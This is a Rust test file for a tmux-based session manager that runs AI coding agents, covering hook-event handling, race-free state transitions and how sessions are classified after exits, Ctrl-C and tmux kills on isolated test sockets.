        // raw stored value instead to assert on `apply_harness_event`'s own effect
        // in isolation, not that later reclassification.
        let raw = sqlx::query_scalar::<_, String>("SELECT status FROM sessions WHERE id = ?")
            .bind(session.id.to_string())
            .fetch_one(mgr.store().pool())
            .await
            .unwrap();
        assert_eq!(raw, "working");
    }

    #[tokio::test]
    async fn test_apply_harness_event_session_ended_transitions_to_done_when_marker_present() {
        // Best-effort: when the `.code` marker is already on disk by the time the
        // `SessionEnded` hook fires, `apply_harness_event` transitions straight to
        // `Done` (reason `exited`) and records `exit_code` itself, instead of
        // waiting for the ordinary dead-backend classification to catch up later.
        let (mgr, _backend, _pool) = test_manager(MockBackend::new().with_alive(true)).await;
        let session = harness_session(&mgr).await;
        let data_dir = mgr.store().data_dir().to_owned();
        let code_path = exit_code_marker_path(&data_dir, &session.id.to_string());
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "0").unwrap();

        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({"hook_event_name": "SessionEnd"}),
        )
        .await
        .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Done);
        assert_eq!(fetched.status_reason.as_deref(), Some("exited"));
        assert_eq!(fetched.exit_code, Some(0));
    }

    #[tokio::test]
    async fn test_apply_harness_event_session_ended_concurrent_calls_transition_exactly_once() {
        // Two concurrent `SessionEnded` hooks for the same session (e.g. a
        // retried/duplicated hook delivery) racing the watchdog's own eager
        // dead-backend sweep — same shape as
        // `test_concurrent_resolve_dead_backend_session_transitions_exactly_once`
        // below, but exercised through `apply_harness_event`'s own CAS
        // (`transition_to_terminal_if_live` with `exit_code` folded in) rather
        // than `resolve_dead_backend_session` directly. Both calls must
        // succeed without error, but only one may actually emit the
        // `lifecycle` event — the loser's CAS returns `Ok(false)` and must
        // return early instead of emitting a duplicate/stale event.
        let (backend, event_tx) = (MockBackend::new(), broadcast::channel(16).0);
        let tmpdir = tempfile::tempdir().unwrap();
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let mgr = SessionManager::new(Arc::new(backend), store.clone(), None)
            .with_event_tx(event_tx.clone(), "test-node".into());
        let session = harness_session(&mgr).await;

        let data_dir = mgr.store().data_dir().to_owned();
        let code_path = exit_code_marker_path(&data_dir, &session.id.to_string());
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "0").unwrap();

        let id = session.id.to_string();
        let event = serde_json::json!({"hook_event_name": "SessionEnd"});
        let mut rx = event_tx.subscribe();

        let (result_a, result_b) = tokio::join!(
            mgr.apply_harness_event(&id, "claude", &event),
            mgr.apply_harness_event(&id, "claude", &event),
        );
        result_a.unwrap();
        result_b.unwrap();

        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Done);
        assert_eq!(fetched.status_reason.as_deref(), Some("exited"));
        assert_eq!(fetched.exit_code, Some(0));

        let mut done_events = 0;
        while let Ok(pulpo_event) = rx.try_recv() {
            if let PulpoEvent::Session(se) = pulpo_event
                && se.status == "done"
            {
                done_events += 1;
            }
        }
        assert_eq!(
            done_events, 1,
            "exactly one of the two concurrent calls must emit the done lifecycle event"
        );
    }

    #[tokio::test]
    async fn test_apply_harness_event_session_ended_without_marker_leaves_exit_code_unset() {
        // No marker on disk yet (the common race): `apply_harness_event` must not
        // error or fabricate a code — the watchdog's marker sweep picks it up once
        // `wrap_command` actually writes it.
        let (mgr, _backend, _pool) = test_manager(MockBackend::new().with_alive(true)).await;
        let session = harness_session(&mgr).await;

        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({"hook_event_name": "SessionEnd"}),
        )
        .await
        .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Working);
        assert!(fetched.exit_code.is_none());
    }

    #[tokio::test]
    async fn test_apply_harness_event_emits_session_event() {
        let (backend, event_tx) = (MockBackend::new(), broadcast::channel(16).0);
        let tmpdir = tempfile::tempdir().unwrap();
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let mgr = SessionManager::new(Arc::new(backend), store, None)
            .with_no_stale_grace()
            .with_event_tx(event_tx.clone(), "node-a".into());
        let mut rx = event_tx.subscribe();
        let session = harness_session(&mgr).await;
        // Drain the creation event.
        let _ = rx.recv().await.unwrap();

        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({"hook_event_name": "UserPromptSubmit"}),
        )
        .await
        .unwrap();

        let event = unwrap_session_event(rx.recv().await.unwrap());
        assert_eq!(event.session_id, session.id.to_string());
        assert_eq!(event.status, "working");
    }

    #[tokio::test]
    async fn test_apply_harness_event_emits_needs_input_on_session_event() {
        // The live SSE `session` event must carry `needs_input` so the web UI's
        // badge updates without a follow-up fetch (see `SessionEvent::needs_input`).
        let (backend, event_tx) = (MockBackend::new(), broadcast::channel(16).0);
        let tmpdir = tempfile::tempdir().unwrap();
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let mgr = SessionManager::new(Arc::new(backend), store, None)
            .with_no_stale_grace()
            .with_event_tx(event_tx.clone(), "node-a".into());
        let mut rx = event_tx.subscribe();
        let session = harness_session(&mgr).await;
        let _ = rx.recv().await.unwrap(); // drain the creation event

        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({"hook_event_name": "Notification", "matcher": "permission_prompt"}),
        )
        .await
        .unwrap();

        let event = unwrap_session_event(rx.recv().await.unwrap());
        assert_eq!(event.needs_input.as_deref(), Some("permission"));

        // Working clears it — the follow-up event must carry `needs_input: None` so
        // the frontend can sync (not just append) the metadata key.
        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({"hook_event_name": "UserPromptSubmit"}),
        )
        .await
        .unwrap();
        let event = unwrap_session_event(rx.recv().await.unwrap());
        assert_eq!(event.needs_input, None);
    }
}

/// Real-tmux integration tests for the session lifecycle QA matrix (docs/operations/
/// session-lifecycle.md) and the Ready-death fix above. Every test here builds a real
/// `SessionManager` — real `TmuxBackend`, real `Store` in a tempdir — and drives it
/// through `create_session` so the actual `wrap_command` wrapper runs, proving the
/// end-to-end mechanics that the `MockBackend`-based unit tests above can only simulate.
///
/// Each test runs against its own throwaway tmux server via `TmuxBackend::with_socket`
/// (`tmux -L pulpo-test-<uuid>`) — never the developer's default tmux server — and
/// tears its socket down with `kill-server` in cleanup. That isolates them from each
/// other's *tmux state*, but they still share the machine's tmux/login-shell startup
/// cost and process table, which is enough to flake under a busy parallel `cargo
/// test` — `crate::test_serial::lock()` (acquired first thing in every test below)
/// serializes them.
///
/// Gated `not(coverage)`, mirroring the other real-tmux/real-git integration tests in
/// this crate (`backend::tmux`'s own integration tests; `git_integration_tests` in
/// `session/utils.rs`): they run in the CI `Test` job, which has tmux and git
/// installed, and are excluded from the coverage build, which doesn't.
///
/// `crate::test_serial::lock()` returns a plain `std::sync::MutexGuard` held across
/// `.await` in several tests below (clippy's `await_holding_lock` would otherwise
/// flag every one) — safe here specifically because `cargo test` runs each test
/// function on its own OS thread with its own single-threaded Tokio runtime: the
/// guard only ever blocks *that* thread until the previous real-tmux test's thread
/// releases it, never something the same runtime needs to make progress elsewhere.
#[allow(clippy::await_holding_lock)]
#[cfg(all(test, not(coverage)))]
mod real_tmux_tests {
    use super::*;
    use crate::backend::tmux::TmuxBackend;
    use std::process::Command as StdCommand;
    use std::time::Duration;

    /// A short, unique-per-test tmux socket name — `tmux -L <name>` connects to an
    /// isolated server instead of the default one, so tests never interfere with (or
    /// get torn down by) the developer's real tmux session.
    fn unique_socket() -> String {
        let short = uuid::Uuid::new_v4().simple().to_string();
        format!("pulpo-test-{}", &short[..8])
    }

    /// Build a real `SessionManager`: a real tmux backend bound to `socket`, and a
    /// real `Store` in a fresh tempdir. The tempdir is returned so the caller keeps
    /// it alive for the test's duration.
    async fn real_manager(socket: &str) -> (SessionManager, tempfile::TempDir) {
        let tmpdir = tempfile::tempdir().unwrap();
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend: Arc<dyn Backend> = Arc::new(TmuxBackend::with_socket(socket.to_owned()));
        let manager = SessionManager::new(backend, store, None).with_no_stale_grace();
        (manager, tmpdir)
    }

    /// Run a raw `tmux -L <socket> <args>` invocation directly — for operations the
    /// `Backend` trait doesn't expose (`kill-server`, a raw control-key `send-keys`).
    fn raw_tmux(socket: &str, args: &[&str]) -> std::process::Output {
        StdCommand::new("tmux")
            .arg("-L")
            .arg(socket)
            .args(args)
            .output()
            .expect("tmux should be installed and runnable")
    }

    /// Best-effort teardown of a test's isolated tmux server. Always passes an
    /// explicit `-L <socket>` — this must never be able to reach the default socket.
    fn kill_test_server(socket: &str) {
        let _ = raw_tmux(socket, &["kill-server"]);
    }

    fn make_req(name: &str, workdir: &str, command: &str, worktree: bool) -> CreateSessionRequest {
        CreateSessionRequest {
            name: name.to_owned(),
            workdir: Some(workdir.to_owned()),
            command: Some(command.to_owned()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: worktree.then_some(true),
            worktree_base: None,
            runtime: None,
            term_program: None,
            budget_cost_usd: None,
        }
    }

    /// Poll `condition` until it returns `true`, up to a generous deadline. Mirrors
    /// `watchdog::tests::wait_for` (see that file for why a fixed sleep isn't safe
    /// under a busy parallel test suite — a starved single-threaded runtime can let
    /// wall-clock time pass without actually polling). Returns `bool` instead of
    /// panicking so call sites can assert with a message that includes the last
    /// observed state.
    async fn wait_for<F, Fut>(deadline_secs: u64, condition: F) -> bool
    where
        F: Fn() -> Fut,
        Fut: std::future::Future<Output = bool>,
    {
        let deadline = tokio::time::Instant::now() + Duration::from_secs(deadline_secs);
        loop {
            if condition().await {
                return true;
            }
            if tokio::time::Instant::now() >= deadline {
                return false;
            }
            tokio::time::sleep(Duration::from_millis(150)).await;
        }
    }

    /// Write a tiny shell script and return `sh <path>` as a session command. A script
    /// file (rather than an inline `sh -c '...'` string) sidesteps nested single-quote
    /// escaping entirely — see the documented `pulpo spawn -- <args>` quoting
    /// limitation in the project memory (trailing-arg joining loses quoting), which
    /// this deliberately avoids by never constructing a quoted inline command.
    fn short_agent_script(dir: &std::path::Path, exit_code: i32) -> String {
        let path = dir.join("agent.sh");
        std::fs::write(&path, format!("exit {exit_code}\n")).unwrap();
        format!("sh {}", path.display())
    }

    async fn wait_for_exit_marker(mgr: &SessionManager, id: &str, deadline_secs: u64) -> bool {
        let data_dir = mgr.store().data_dir().to_owned();
        wait_for(deadline_secs, || {
            let data_dir = data_dir.clone();
            async move { crate::session::utils::has_exit_marker(&data_dir, id) }
        })
        .await
    }

    async fn wait_for_status(
        mgr: &SessionManager,
        id: &str,
        status: SessionStatus,
        deadline_secs: u64,
    ) -> bool {
        wait_for(deadline_secs, || async {
            matches!(mgr.get_session(id).await, Ok(Some(s)) if s.status == status)
        })
        .await
    }

    // -- Cell 3: CI promotion of THE bug (#94), updated for ADR 0009 --------------
    //
    // A short agent exits, writing the `.code` marker. Since `wrap_command` no
    // longer keeps a fallback shell alive after the agent exits (ADR 0009 — the old
    // `Ready` state), the wrapper shell itself exits right behind it and tmux tears
    // the whole session down automatically — there's no lingering shell left for a
    // user to `exit` out of anymore. The dead tmux session must classify as `Done`
    // (reason `exited`) with the agent's real exit code, not `Lost` — this is the
    // exact regression #94 fixed (previously classified Lost, indistinguishable
    // from a crash), now reached without any manual shell-exit step at all.

    #[tokio::test]
    async fn test_cell3_short_agent_exit_classifies_done_with_exit_code() {
        // Real-tmux tests share a process-wide lock (see `crate::test_serial`)
        // so they never run concurrently under a parallel `cargo test`.
        let _guard = crate::test_serial::lock();
        let socket = unique_socket();
        let (mgr, _tmp) = real_manager(&socket).await;
        let script_dir = tempfile::tempdir().unwrap();
        let command = short_agent_script(script_dir.path(), 7);

        let session = mgr
            .create_session(make_req("cell3-exit-code", "/tmp", &command, false))
            .await
            .unwrap();
        let id = session.id.to_string();

        assert!(
            wait_for_exit_marker(&mgr, &id, 20).await,
            "the wrapper should write the .code exit marker once the short agent exits"
        );

        // No fallback shell left to exit out of — the wrapper (and tmux with it)
        // should already be gone or about to go by the time the marker is on disk.
        let done = wait_for_status(&mgr, &id, SessionStatus::Done, 20).await;
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert!(
            done,
            "session should classify to Done, got {:?}",
            fetched.status
        );
        assert_eq!(fetched.status_reason.as_deref(), Some("exited"));
        assert_eq!(fetched.exit_code, Some(7));

        kill_test_server(&socket);
    }

    // -- Cell 4: Ctrl-C sent to a running agent -----------------------------------
    //
    // `wrap_command` runs the wrapped agent as the foreground child of a
    // *non-interactive* `$SHELL -l -c '...'` invocation (no `-i`, so bash/zsh never
    // enable job control there). Empirically verified against both bash and zsh on
    // this workstation: a `send-keys C-c` delivers SIGINT to the pane's whole
    // foreground process group — since there's no job control, that's the wrapper
    // shell *and* its child together, not just the child — so the wrapper shell dies
    // before it can reach its `ec=$?; echo "$ec" > .code` tail. The entire tmux pane
    // exits immediately, with no exit marker ever written (confirmed by hand: `tmux
    // new-session … "$SHELL -l -c 'sleep 300; echo done > marker'"` followed by
    // `send-keys C-c` leaves no marker file and no tmux session behind).
    //
    // So — contrary to a naive assumption that Ctrl-C only interrupts the agent and
    // leaves the fallback shell to record a graceful exit code — a raw Ctrl-C is, from
    // the daemon's perspective, indistinguishable from an external `kill-session`:
    // both kill the whole pane with no marker, and the session correctly resolves to
    // Lost. This test locks in that real, verified behavior rather than asserting a
    // Stopped-with-exit-code outcome the wrapper cannot actually produce.
    #[tokio::test]
    async fn test_cell4_ctrl_c_kills_whole_pane_classifies_lost() {
        // Real-tmux tests share a process-wide lock (see `crate::test_serial`)
        // so they never run concurrently under a parallel `cargo test`.
        let _guard = crate::test_serial::lock();
        let socket = unique_socket();
        let (mgr, _tmp) = real_manager(&socket).await;

        let session = mgr
            .create_session(make_req("cell4-ctrl-c", "/tmp", "sleep 300", false))
            .await
            .unwrap();
        let id = session.id.to_string();
        let backend_id = session
            .backend_session_id
            .clone()
            .expect("backend session id should resolve on create");

        let alive = wait_for(10, || async {
            mgr.backend().is_alive(&backend_id).unwrap_or(false)
        })
        .await;
        assert!(alive, "long-running session should be alive before Ctrl-C");

        raw_tmux(&socket, &["send-keys", "-t", &backend_id, "C-c"]);

        let lost = wait_for_status(&mgr, &id, SessionStatus::Lost, 20).await;
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert!(
            lost,
            "Ctrl-C kills the whole non-interactive wrapper pane with no exit marker, \
             so the session should classify to Lost, got {:?}",
            fetched.status
        );
        assert_eq!(fetched.exit_code, None);

        kill_test_server(&socket);
    }

    // -- Cell 5: kill-session mid-run ----------------------------------------------
    //
    // tmux is killed directly (not via the agent exiting) while a long-running agent
    // is still running — no exit marker is ever written, so this must resolve to
    // Lost, not Stopped.

    #[tokio::test]
    async fn test_cell5_kill_session_mid_run_classifies_lost() {
        // Real-tmux tests share a process-wide lock (see `crate::test_serial`)
        // so they never run concurrently under a parallel `cargo test`.
        let _guard = crate::test_serial::lock();
        let socket = unique_socket();
        let (mgr, _tmp) = real_manager(&socket).await;

        let session = mgr
            .create_session(make_req("cell5-kill-session", "/tmp", "sleep 300", false))
            .await
            .unwrap();
        let id = session.id.to_string();
        let backend_id = session
            .backend_session_id
            .clone()
            .expect("backend session id should resolve on create");

        let alive = wait_for(10, || async {
            mgr.backend().is_alive(&backend_id).unwrap_or(false)
        })
        .await;
        assert!(
            alive,
            "long-running session should be alive before the kill"
        );

        raw_tmux(&socket, &["kill-session", "-t", &backend_id]);

        let lost = wait_for_status(&mgr, &id, SessionStatus::Lost, 20).await;
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert!(
            lost,
            "session should classify to Lost after kill-session mid-run, got {:?}",
            fetched.status
        );
        assert_eq!(fetched.exit_code, None);

        kill_test_server(&socket);
    }

    // -- Cell 6: kill-server mid-run ------------------------------------------------
    //
    // The whole tmux server (this test's isolated socket) is killed while a
    // long-running agent is still running. Same outcome as Cell 5 but at server
    // granularity — still resolves to Lost.

    #[tokio::test]
    async fn test_cell6_kill_server_mid_run_classifies_lost() {
        // Real-tmux tests share a process-wide lock (see `crate::test_serial`)
        // so they never run concurrently under a parallel `cargo test`.
        let _guard = crate::test_serial::lock();
        let socket = unique_socket();
        let (mgr, _tmp) = real_manager(&socket).await;

        let session = mgr
            .create_session(make_req("cell6-kill-server", "/tmp", "sleep 300", false))
            .await
            .unwrap();
        let id = session.id.to_string();
        let backend_id = session
            .backend_session_id
            .clone()
            .expect("backend session id should resolve on create");

        let alive = wait_for(10, || async {
            mgr.backend().is_alive(&backend_id).unwrap_or(false)
        })
        .await;
        assert!(
            alive,
            "long-running session should be alive before the kill"
        );

        raw_tmux(&socket, &["kill-server"]);

        let lost = wait_for_status(&mgr, &id, SessionStatus::Lost, 20).await;
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert!(
            lost,
            "session should classify to Lost after kill-server mid-run, got {:?}",
            fetched.status
        );
        assert_eq!(fetched.exit_code, None);

        // The server (and its socket) is already gone — nothing left to tear down.
    }

    // Cell 9 (worktree reclaim end-to-end: a `worktree: true` session's directory
    // and exit markers are removed from disk by `cleanup_dead_sessions` after the
    // session dies) was migrated to the end-to-end scenario suite's S9
    // (`crates/pulpo-e2e/tests/scenarios.rs::s9_worktrees_distinct_survive_stop_and_removed_by_cleanup`)
    // and deleted here — S9 covers the same reclaim path plus two *distinct*
    // worktrees on one repo and a stop-without-purge survival check this test
    // never had.

    // -- Cell 10: detach/no-client -------------------------------------------------
    //
    // A real attach/detach round-trip (`script -q /dev/null tmux -L <socket> attach
    // …` then a detach keystroke) was tried and rejected: `spawn_attach` shells out
    // through `script(1)` to fake a PTY, and driving + verifying a clean detach
    // headlessly (no real terminal, no human at the keyboard) turned out to depend on
    // `script`'s own PTY emulation quirks across macOS/Linux and on precise timing
    // between the attach handshake and the detach keystroke — exactly the kind of
    // environment-flakiness this task was told to avoid ("don't ship a flaky test").
    // It also wouldn't prove anything the rest of this module doesn't already cover:
    // detaching a client never touches the backend tmux session at all (tmux keeps
    // running with zero attached clients — that's normal, expected operation, not a
    // lifecycle transition), so the real thing worth proving is the documented
    // *approximation*: a session with no attached client is simply a live session
    // like any other from the watchdog's point of view, and repeated staleness/idle
    // checks against it must be stable — no spurious transition — across several
    // consecutive ticks.
    #[tokio::test]
    async fn test_cell10_no_client_session_stable_across_repeated_checks() {
        // Real-tmux tests share a process-wide lock (see `crate::test_serial`)
        // so they never run concurrently under a parallel `cargo test`.
        let _guard = crate::test_serial::lock();
        let socket = unique_socket();
        let (mgr, _tmp) = real_manager(&socket).await;

        let session = mgr
            .create_session(make_req("cell10-no-client", "/tmp", "sleep 300", false))
            .await
            .unwrap();
        let id = session.id.to_string();
        let backend_id = session
            .backend_session_id
            .clone()
            .expect("backend session id should resolve on create");

        let alive = wait_for(10, || async {
            mgr.backend().is_alive(&backend_id).unwrap_or(false)
        })
        .await;
        assert!(alive, "session should be alive before the no-client checks");

        // No client ever attaches — `create_session` only ever `new-session -d`s
        // (detached). Repeatedly re-run the same staleness sweep `get_session` does
        // on every API call, and confirm the session is never spuriously reclassified
        // while the backend is genuinely still alive and no exit marker exists.
        for _ in 0..3 {
            let fetched = mgr.get_session(&id).await.unwrap().unwrap();
            assert_eq!(
                fetched.status,
                SessionStatus::Working,
                "an unattached-but-alive session must not spuriously transition"
            );
            tokio::time::sleep(Duration::from_millis(300)).await;
        }

        kill_test_server(&socket);
    }
}
